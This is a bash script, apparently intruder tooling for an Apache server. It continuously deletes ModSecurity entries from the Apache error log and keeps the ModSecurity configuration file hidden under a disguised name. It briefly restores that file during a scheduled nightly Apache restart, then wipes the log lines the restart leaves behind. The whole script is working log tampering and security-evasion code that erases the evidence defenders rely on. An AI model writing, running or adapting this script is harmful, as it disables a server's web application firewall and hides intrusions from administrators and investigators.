#!/bin/bash

export LC_ALL=C

# --- Paths ---
LOG_FILE="/var/log/apache2/error.log"
MODSEC_BASE="/etc/modsecurity/modsecurity.conf"
MODSEC_TEMP="/etc/modsecurity/modsecuritybL6qM.conf"
SCRIPT_LOG="/var/tmp/cleaner_bL6qM1.log"

# --- Logger Function [Time | Action | Status] ---
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') | $1 | $2" >> "$SCRIPT_LOG"
}

# 1. Initial cleanup on startup
if [ -f "$LOG_FILE" ]; then
    sed -i '/ModSecurity/d' "$LOG_FILE"
    log "Init-Clean" "Success"
fi

# 2. Background monitor for realtime cleanup
(
  log "Monitor" "Started"
  while inotifywait -e modify "$LOG_FILE" 2>/dev/null; do
    if sed -i '/ModSecurity/d' "$LOG_FILE"; then
        # log "Realtime-Clean" "OK"
        :
    fi
  done
) &

# 3. Main Loop
while true; do
  CURRENT_TIME=$(date +"%H:%M")

  if [ "$CURRENT_TIME" == "00:05" ]; then
    TIME_PATTERN=$(date +"%a %b %d %H:%M")

    # Restore Config (Hidden -> Active)
    if [ -f "$MODSEC_TEMP" ]; then
        mv -f "$MODSEC_TEMP" "$MODSEC_BASE" && log "Config-Restore" "Done"
    else
        log "Config-Restore" "Not_Found"
    fi
    
    # Restart Service
    if sudo systemctl restart apache2; then
        log "Apache-Restart" "Success"
    else
        log "Apache-Restart" "Failed"
    fi

    # Hide Config (Active -> Hidden)
    if [ -f "$MODSEC_BASE" ]; then
        mv -f "$MODSEC_BASE" "$MODSEC_TEMP" && log "Config-Hide" "Done"
    fi

    sleep 2
    
    # Trace Cleanup
    CLEAN_PATTERN="Apache\/2\|mpm_\|configured\|resuming\|SIG\|Command line\|Server built\|mod_security\|APR\|OpenSSL\|ssl:warn\|AH01906\|AH01909\|PCRE2\|LUA\|YAJL\|LIBXML\|Status engine"
    
    if sed -i "/$TIME_PATTERN.*\($CLEAN_PATTERN\)/d" "$LOG_FILE"; then
        sed -i '/^\s*$/d' "$LOG_FILE"
        log "Trace-Cleanup" "Done"
    fi

    sleep 61
  fi

  sleep 30
done
